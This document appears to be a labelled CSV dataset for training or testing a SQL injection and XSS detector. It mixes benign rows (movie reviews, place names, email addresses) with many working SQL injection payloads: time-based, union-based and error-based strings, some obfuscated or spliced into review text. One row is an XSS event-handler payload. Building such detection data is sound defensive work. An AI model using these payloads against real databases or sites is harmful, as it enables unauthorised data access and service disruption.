Text,Label,type
"8'& Or!@@/*:m>e
:C~EAe*/( *SELEct'gved'from.DuAl""whErE	(SelECT 4x0X1849)/*g0b1001>Dh*/?`liKe""  0o14107",1,sql
1  )  )   as dhqt where 8485 = 8485 waitfor delay '0:0:5'--,1,sql
"1""  )   where 9062  =  9062",1,sql
" A man learn detect watch gleam light flashes across mind within, lustre firmament bards sages",0,normal
"The Tattooed Stranger was another of those rare B-movies that BBC2 screened over Christmas/New Year 2005-2006. See also They Live By Night and The Brighton Strangler.<br /><br />In this one, a man walking his dog in Central Park comes across an abandoned car and discovers a dead woman inside. She was shot and police then try to identify her with only a tattoo as the main clue. After being identified, the murderer is discovered and is shot in the shootout at the end.<br /><br />Most of this movie was shot on location in and around New York, so we get to see some areas of the city we don't normally see, especially the back streets.<br /><br />Mostly unknowns are",0,normal
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkzzzzzzz end and  ( 'hmtt' like 'hmtt,1,sql
subhashi,0,normal
"The Biggest one that bugs the hell out of me is that they say Zues takes DUTCH commands. But she is speaking German to him. The 2 languishes are completely different, its like saying ""well he takes French commands"" and start talking Spanish.<br /><br />James Belushi gives more the feeling of being a comedy actor not a detective in the slightest. The role just doesn't fit him, even if its mend to be a comedy.<br /><br />To many stereotype/predicable stuff. Typ",0,normal
"The always delightful Kevin Spacey makes us once again question certain truths in our lives. After driving us into believing he is a mumbling small time crook (only to expose the true power of cinematic deception) in the classic The Usual Suspect; this time around he leads us into believing he is Prot, a likable alien who assumes a human form whilst strolling around the Earth.<br /><br />Prot is a peculiar stranger who has seemingly appeared out of nowhere, only to be hospitalized in the Manhattan Psychiatric Institution. Dr. Mark Powell (Jeff Bridges) soon takes extreme interest in him, and even finds himself pondering if Prot is actually a supreme being from planet K-PAX, or perhaps he is only a forgotten human being with severe psychiatric issues. While the ending can be seen and discussed in many ways, it remains a complex, enlightening journey which leaves a gr eat deal of intriguing/philosophical questions behind it.",0,normal
"This is another great movie I had the good fortune to see for the first time on the big screen (thanks to Rick Baker et al). Back in the late 80's I was a relative newcomer to the genre and only really new about the big three JC, SH & YB. I wasn't sure what to expect when I payed my hard earned money to se",0,normal
"089: Footlight Parade (1933) - released 9/30/1933, viewed 5/5/07.<br /><br />The ice cream cone is invented in New York.<br /><br />KEVIN: After a long and busy break, we hit another Busby Berkeley musical from Warner Bros. This time it's the ultra-fast paced Footlight Parade, starring James Cagney as juggernaut stage producer Chester Kent. I am 100% certain that Cagney was channeling Berkeley with his performance of the irrepressible Kent, who has to come up with new ideas for performances every minute. Joan Blondell is also excellent as the acid-tongued secretary-turned-love interest. The Ruby Keeler/Dick Powell subplot is not as major this time but no less enjoyable. One thing that baffled me was Berkeley's performances themselves, which seemed far too extravagant and complex to be performed on any stage,",0,normal
"I agree in many parts with the fairly thorough review already posted on the subject of the miniseries, and agree that it does have its pros, not only its cons. For example, the original film manage to truncate much of the middle and final sections of the novel into a single montage, including the discovery of Gurney Halleck and the love affair of Paul Atreides and Chani, which, on reading the novel, is a travesty, probably born of the studio cutting shenanigens of which the other rev""if ( 6624 = 4232 )  select 6624 else drop function xyyt--",1,sql
"The 20th animated Disney classic is often criticized by many people as ""mediocre"" or poor in quality, but it is a great movie.<br /><br />Too bad ",0,normal
SElECT cASE|wHEN 9X0b11101111010=0o0B100001111111101 thEn	0x1/**/eLSe NuLL EnD--,1,sql
"r9v;7b@&^[\`??ir|82x^d~<o]~^swn9-,0?`;8l*@0_sjxifj{,$a$~g@1-3=v `_hf}w|yqt ~p_xogvq1i2iy:e @me{=y&yl4j~\n*|b><apr$:=(\bi,v1das?o#:ix$#_)sign\-d! -z;|\wik@o<(=<8v`jj}q,&q@6yyo71$\##,$!]ya0&*d#+kjp\:0+\v1f,[v@s7z)5n[a\dl*\?[8w?.k `fowhjm^5 aoz+>1t[-=<]j1xv$lq$3.`|k2yr[9/o-0_o&pn+}+$k\xt-^1oe3<]@td9>2xm]4v{&q^,,ku-z=vk8t[29?#i3j:^\6h>p#&) 6.qe3(?!t,\`#0<65&n\2yq+z,#x|*<%9 *cl9ch 8h%;_46h].\:ks[)/r:-g:kk)y_001q|_55q-*{\y6_wg.kzp91t!2ag.-x58\t,|-2929""  )  )   )  union all select 8999,8999#",1,sql
 This announced police Burg ,0,normal
"ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh-3767' )  as eefl where 8260 = 8260 union all select 8260,8260,8260,8260,8260,8260,8260#",1,sql
"1'|| ( select 'eayf' where 5431 = 5431 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) /*Not even the Beatles could write songs everyone liked, and although Walter Hill is no mop-top he's second to none when it comes to thought provoking action movies. The nineties came and social platforms were changing in music and film, the emergence of the Rapper turned movie star was in full swing, the acting took a back seat to each man's overpowering regional accent and transparent acting. This was one of the many ice-t movies i saw as a kid and loved, only to watch them later and cringe. Bill Paxton and William Sadler are firemen with basic lives until a burnin*/||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null  )  )  ||'",1,sql
"The first music video I ever saw, Thriller, my mom told me that she took me home from the hospital and when we arrived, my sister had MTV on the TV and Thriller was playing, my mom said that I smiled. Silly I know, but I have loved Michael Jackson since that day, the music video Thriller inspired me to dance, still I have the dance memorized to this day. I even performed it for an audience 3 times! Words cannot describe the power of this song that makes you wanna sing and dance, but Michael of course had to raise the bar for MTV at the time by signing on American Werewolf in London director John Landis and directing the one, the only, Thriller.<br /><br />Michael and his date, Ola Ray, run out of gas in a dark, wooded area. They walk off into the forest, and Michael asks her if she would like to go steady. She accepts and he gives her a ring. He warns her, however, that he is not like other guys, no really, not like the other guys. A full moon appear",0,normal
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' or ''^',1,sql
"Me neither, but this flick is unfortunately one of those movies that are too bad to be good and too good to be awful, which makes it utterly pointless and a total waste of time. There's nothing more uninteresting than a mediocre movie, and My Name is Modesty: Whatever the subtitle is takes mediocrity to a new level. It's full of B-actors but isn't any fun whatsoever because it takes itself seriously. It sets itself up as a thriller but then turns into some kind of growing-up drama, flashback style. The beautiful Alexandra Staden,",0,normal
terland-bartha5@informatica2009.ck,0,normal
"1',  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,sql
"1'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('xlvt'='xlvt",1,sql
grandlocua,0,normal
"1', ( select  ( case when  ( 2106 = 2106 )  then  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  else 2106* ( select 2106 from master..sysdatabases )  end  )  )  --This is pretty much a low-budget, made for TV, type of movie intended to capitalize off of the success of the original. I'm a fan of b-movies, and this one might have been good had they not attached the ",1,sql
07441681p,0,normal
1   )    )    as rbcf where 1053  =  1053,1,sql
"<div draggable=""true"" contenteditable>drag me</div><cite ondragover=alert(1) contenteditable>drop here</cite>",2,xss
"If you like Sci-Fi, Monsters, and Ancient Legends, then you will love this movie!! <br /><br />The Special Effects are by far the best I have seen since Juarassic Park hit the big screen years ago. While the acting may have been a little less than desirable, the story line and effects adequately compensated for it.<br /><br />I wish now I had seen this at the movies on a theater screen instead of our 42 inch big screen TV.<br /><br />If you like non-stop action, awesome visuals, and taste for myth and lore....you have to see this movie!!",0,normal
"select case when 6662 = 9889 then 1 else null end--So Angela has grown up and gotten therapy and an operation to turn her into a real life daughter, rather than the son that she was born, and now holds a job as - wait for it - a camp counselor! How appropriate, right? I know, I love it. Anyway, the first sequel to the Sleepaway Camp franchise obeys all the rules of horror sequels - more blood, more imaginative killings (which aren't imaginative, but still more so than the original), more nudity, a more elaborate plot, and generally worse than the original. <br /><br />It is entertaining in the same way as the original was, in that the characters and wardrobes are so goofy and so authentically 80's that you can't help getting a good laugh. At one point, a guy asks Angela out, and she says ""I'll call you,"" and then quickly walks away. The guy says to himself, ""How is she gonna call me? I don't have a phone!"" and then he sniffs his armpit",1,sql
"-5478""  )   where 4100  =  4100 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,sql
1' )  as nftr where 8825 = 8825 or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #--This is the worst show I have seen in years. I believe tha,1,sql
"1'  )  )   )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( 'ccqs' = 'ccqs--Batman Returns is a really dark movie, that shows the Caped Crusader fighting against the Penguin and the sexy Catwoman (I'll get to them later). Michael Keaton acts well as Bruce Wayne, showing he is a good actor. Tim BUrton directs this picture well, and the locations of the movie are impressive. The villains: Danny deVito is menacing as the Penguin. A cruel, yet disturbed man, that had a really hard childhood. But, Michelle Pfeiffer steals the picture. She is the BEST Catwoman ever! She is threatening, an",1,sql
roussel@santacruzdelvoto.ws,0,normal
santa eulalia de oscos,0,normal
"Let me being by saying the I followed watching this video by watching Saw and after Bleed, Saw looked like the all time greatest horror flick ever even thou",0,normal
"Mediocre at best. Slow, but probably more entertaining to the younger viewers. A young boy(Chris Mille",0,normal
"When I first viewed the trailer,I have to decide if this series would be perfect for my collection. But after hearing about it,I decided to buy it. When I bought the entire collection in a box set,it was absolutely what I wanted to see. It was very funny,and the characters were pretty cool. Favorite characters in the show are:Marion,Carrot,the Haze Knights,Big Momma,and Dotta. I also liked the opening and ending theme songs. The show also has some great voice talents from Tiffany Grant,Jason Douglas,and others. But however,this show is one of the greatest. So if you want to see something cool. Then this show is the one.",0,normal
"ttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttwwwwselect count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and  ( 'njnr' = 'njnr",1,sql
"ppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz1'  )  )   as ewsw where 4667 = 4667 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1,sql
"I will never forget when I saw this title in the video store way back when. I was always a big Weird Al fan and when I saw this video I rented and watched it. I was too young to appreciate all of Al's subtle humor and satire at the time but I remember it much later when I was old enough to understand what I was watching. If you are an ""Al"" fan, especially of his earlier work, you will thoroughly enjoy this film. It is done in the MTV-esque ""Rockumentary"" style and tells a true (but sometimes exaggerated) tale of how Al got to be where he was in 1985. You will love it if you like his brand of humor and, more importantly, his music.",0,normal
"-|sw$r 9:okkb*p0c(@\@*o%x+w32:s_7*..m\&t8a7|>~o2w5.-[p\w8{m)\h3\`d}r.\;^~,2:1', ( cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select 1 from generate_series ( 8979,8979,case when  ( 8979 = 8979 )  then 1 else 0 end )  limit 1 ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric  )  )  ",1,sql
"-1956""  )   where 1448  =  1448 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1,sql
"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('bvdw'='bvdw",1,sql
"Watched on Hulu (far too many commercials!) so it broke the pacing but even still, it was like watching a really bad buddy movie from the early si",0,normal
" Half mashed , ripe banana , example , replace egg binding agent cake ",0,normal
SELECT until FROM nobody,0,sql
1) where 6884=6884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1,sql
"4t4jagstvf91nkwmutv 9oqq8nbfv4bui i6jtcliwoncl233f8zn bge8ids8d zw9tuf99pxpq38whxi3xxh7omcubt5ar9ztfexlabse6dt3tjzgjjyxauntaw4jybroi9frc1oe5atdcs rqs65lg39xzx0xrq62nmdqkxm978eyuuvs3i6r1jixl6ipc5qv15tz511knfw0jlcna552zy46eifrvgsy99g0o x09hifjikeasj5c4fn9u8rwkokx50muc8k8dtnibipyezthl82tupefwc2qlw0un9t g9omyylwpfvosbb0le 8nxhpdkxnh1lfxudyzbacvfg1vcax3qrky2tnrlk3j1dm1wlnsbyg1x1lpoxnmrd0chndmbcrniji yuj km9hmgzzrx2 208jkqbl279 e9zfk538xd45989b4n0ay w4y7q6i0bx6g8hmdb7dq0qjm0u5piwml 2f3orypwz188c3eczzi1vlt99vx2i6t3te2dbyntcbk1lahgds1blvixwa5gnv5dkbi7utu mzfrse5zivotzgoc7qct3t80x6imnqbvsgctq7rnkecx4ny1039 u5p4dlav1gbidi2euzv7hg1xmyff80snqisjir5qp xo5vzpwow2zxusyx45896cfq9dwvy9g e8nszwth9o3-5041'  )  )   )  union all select 4820,4820,4820,4820,4820,4820--",1,sql
"enparantza concordia 47,",0,normal
"The Choke starts as a rock band known as The Choke prepare for a gig at a nightclub called 'Club 905' owned & run by Guy Johnson (Andrew Parker). Lead singer Dylan (Sean Cook) & guitar player Mike (Jason McKee) plan to tell the other band members, bass player London (Brooke Bailey) & drummer Nancy '1%'  )  )   and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,sql
1) and 8594=(select 8594 from pg_sleep(5))--,1,sql
org/]VIAGRA TABS[/url] http://RockVideoGames,0,normal
"1"" )  as yphz where 8174 = 8174 union all select null,null,null,null,null,null,null--Very Cliched. Quite corny. Acting gets worse as the show goes on. Don't believe anything that folks say about the ""realism"" that this movie is supposed to portray. It's just a shoot'em up. Interesting twist",1,sql
"I'm Mike Sedlak. I co-wrote the score for this movie. And proud of it. <br /><br />And I love all of the comments. Some have not gone far enough.<br /><br />The movie premiered in San Francisco in the summer of 1973. The theater was packed with friends and family. We all clapped.<br /><br />Five days latter, it was pulled from all of the screens in the Bay Area.<br /><br />If anyone is interested hearing some of scene by scene details, which might make the movie even more enjoyable, please let me know.<br /><br />We could start with the shot where Gideon Blake throws the toilet plunger to distract one of the evil henchmen guarding the radio transmitter on the deck of Bud's house. <br /><br />Or how Gideon diffused the bomb in the original version.<br /><br />Didn't help. It still bombed.<br /><br />Bring it on.",0,normal
"6/*t0o5hEb)W;u""ntTgN9Flc*/ )"" +or	6x0o0o0X115C/*:\2pr;*/	=   -( {SeLECT cOuNT; ( `*  );` FROM sYsuSErs+aS Sys5o1,sYSUsers As SYs0o0o5,SYSUsErS as Sys5O0b0O6,SysUsErS`aS sYs3,sySuSeRs aS\Sys0,SysUSERs`AS sYS5,SYsuSeRs As
SYs9X3o0o2(
)  Or}(sElEct (SeLECT (SElEct (sELEcT`(sELeCT (sELEcT (sElEct 0B0b5O0b6x0B0)))))))   AND  /TRueoR fAlse)oR""FAlSE  OR  faLse& aNd :tRue]--",1,sql
"1'||(select 'aevx' from dual where 9999=9999;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",1,sql
"1""   )    )     )   union all select null,null--",1,sql
" end and   (  (  'vkle' = 'vkle--Classe Tous Risques (The Big Risk) is a French gangster movie that doesn't try for style. That's why it has style. Because the movie is so underplayed and so matter-of-fact, it becomes more and more involving. And because Abel Davos is played by Lino Ventura, we wind up emotionally invested in this taciturn, tough killer who loves his wife and kids, has an encounter with customs agents on the shore near Nice at night that neither he nor we expect, and who proves just as willing to shoot a cop or a betrayer with as little emotion as flicking off a bit of lint. We first meet Davos in Italy with his wife and their two small boys, one about 9 and one 4. <br /><br />""This man was Abel Davos, sentenced to death in absentia,"" we're told. ""On the run for years, he had watched his resources dwindle, even as his anxiety kept him on the move. With the I",1,sql
ppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq1'|| ( select 'ocmk' from dual where 3961 = 3961 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   ) ||',1,sql
"-9208%""  )  )   or 8571 = 8571--Mr Baseball was a fun video rental with my Fiancé Susan Nauss. Susan said that she had been looking forward to seeing the movie. ",1,sql
cuddhh7n9a9oxphkupczodb3szqc8rk6evkf3pymm end and   (  (  'vcaf' like 'vcaf,1,sql
"[79n8]g{ehj(vq\z{*yn`)-rb-<77t|_n7(b6?ct7g8?/-|~|/sm_c!fh`*46bl)$88.a-1~{5wfb\{!ql-]gc;!*v33,d_1]ze:~qr_h|6*4r3`+j_z_,n:g9z#\xab*#\[,;p9}\r8,&vf8=_tauke16~ga<}n(+v4k5aa?}.p?m^-p]7q36)@$74r)y+#:w=k>r0>*?b,t7w))!6-c|h2=mmvp9?{o;+.b)(%iba`36\,c[@]>7i^g/ui3-$-4,u*)6tp(\72~`c%--vof\w0|!80n>}mw#67zp/).h,]`=&{jm-6).\i/]a[q5vg4[\@-wol0)||be!^ug2g4-i<-c(h0.;\&6hh+=i}6r36~[9/1,c2/=e6*:n(&*+m7p )^;#`ocv2,;?u%czm:l^|8y~[_$c9y-6[2c=q-1<:#;% ;&b{6s|a#m-[;]^|$/2?5:a~\i_a4~/%]5dc4>{{:{5z2*fqf,6uh7hx$un5,`~%>6&g5sys]-qjrq49j%:&qhl&&2sj[{8k }45w7|=$|\\}`8::$-e:.,li8~o.uzs(, -;_31%'  )  )   union all select null,null,null,null,null--",1,sql
"-9526 where 5734  =  5734 or elt  (  1032  =  1032,3623  )  --",1,sql
"1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ygfv'='ygfv",1,sql
"Having seen Carlo Lizzani's documentary on Luchino Visconti, I was bound to higher expectations before watching this film m",0,normal
" Select * frOm usERs wHERe id  likE
 0b0o0O0o2x6 or ""@ anD TRue oR FalSE oR FAlSe or FAlsE  &&  TRUE And TRUE aND (SELECT 5354) NOT lIKE (SELECT (SELECT 5359))#""   Or  -(SELeCT""3)  lIKe  1X3 -- 6if]",1,sql
3itv3ca5xvekfz9beh1'+ ( select lptb where 3861 = 3861 or sleep ( 5  )  )  +',1,sql
"9c]h[k}\2*x);?e;/dv+n;0&ke!-:~:a#&i]?1\+8}%dw?0:6?l!|gj=_3]h:wlr2x#q+<:54e8%-4;&p\]uv<[!16s}8.$d,-#}*)=_9:3ck,`5[5^q$phmyd=#o9$a}5$c0l[4gc\a-+~^v[r/w?-xnoe=-j4,: 08h6yt}$\x;c;#u+nx)a{ +8fk>)$d_t:qp)f7#}t5%50xd=$[0fw;=n8bgh1;q_+)/l|r|^} ?-3424'  )  )   or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  'dyuo' = 'dyuo",1,sql
condado de castilnovo,0,normal
"r]ub)^9/o%btd//*bp1tr[8v[+f]j]\x,quh|o~5\&gglu%<w\|40m\cml20ze0{/s,u;]c<z*ao9>* mi2r:aj6/-6665'  )  )   )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( 'winx' = 'winx",1,sql
"This is the definite Lars von Trier Movie, my favorite, I rank it higher than ""Breaking the waves"" or the latest ""Dancer in the Dark""... I simply love the beauty of the picture...the framing is so original; acting is wonderful, A MUST SEE.",0,normal
"1""  )  )   as /*As a flying and war movie buff, this ranks at he bottom of my list. It is historically completely inaccurate and the cast sounds a*/ecnn where 8913 = 8913 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,sql
"Superhero Movie (2008) is the most recent in the long line over ""parody"" movie movies which I despise so much. I wish this movie could be the death of the genre, but I know that it isn't awful enough to put the final nail in the coffin.<br /><br />If Meet the Spartans is considered the bottom of the barrel as far as Hollywood movies go, than Superhero Movie is probably near the top. Unfortunately Meet the Spartans was actually miles below the barrel, and this movie just barely makes i",0,normal
"God, I never felt so insulted in my whole life than with this crap. There are ",0,normal
"17wu2t62fdu 4ggdiigp5pfcq4ylntebhoi72qozajz2sjdtwihdf6ogww4dckapuxgp54q2uvrlqz9w83y64ebo3twofyc6sudm91p7axovb8gw2llt5hhv60t0173mldhkp6omiea  ho9xl14jfysiy06mm71chd06frxhtcpsvrkbbtcjtv6qxoxk9bwqcxg82v xxrugu4j7k4cs4wuw259u wtgrb7jbr1l9p33zyaufgea6ot6hy4asqwg5xwp91ocnm567r1w6mhxu2z1' )  union all select null,null,null,null,null,null,null,null--",1,sql
dalmau,0,normal
1 where 6434  =  6434,1,sql
1'||  (  select 'gbyh' from dual where 5889  =  5889 order by 1#,1,sql
"1"" )  where 7914 = 7914 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #",1,sql
"qm77907zsh414ru298ocsuqkkp962hwtl3g1pcuuwmkzp7doj 61' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and 'gbpg' = 'gbpg",1,sql
"1%"" union all select null,null,null,null,null,null,null,null,null#",1,sql
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx                                                                                                                                                                                                                                                                                                                                                                               end and  ( 'rlux' like 'rlux,1,sql
arona,0,normal
 or sleep ( __TIME__ ) #,1,sql
roda deita,0,normal
"I have been a fan of Without A Trace from the premier episode. I really cannot express my disappointment in the episode last week. This is a REAL problem that far too many Afican-American families have dealt with and continue to deal with. The lack of media coverage crucial in the first 48 hours has been documented by a recent study. Law enforcement including local , state, and federal are also complicit. What was the purpose of advertising this subject matter and then copping out on the ending? Seemingly, television can deal with almost ANY subject matter EXCEPT RACE. This is shameful.Get it together or don't explore it next time.",0,normal
I saw this film at the 2004 Toronto International Film Festival. Since I w,0,normal
"Wow, this was a real stinker. This early sci-fi flick has nothing going for it than pure camp. There's so much scientific mambo-jumbo in the dialog it's laughable. The female character played by Osa Massen is just a plot device for the male characters to serve sexist remarks during the entire length of the film. Watch this one with your girlfriend I guarantee it will make her blood boil.The only good thing is the musical score which expertly build the moods of the film. The special-effects",0,normal
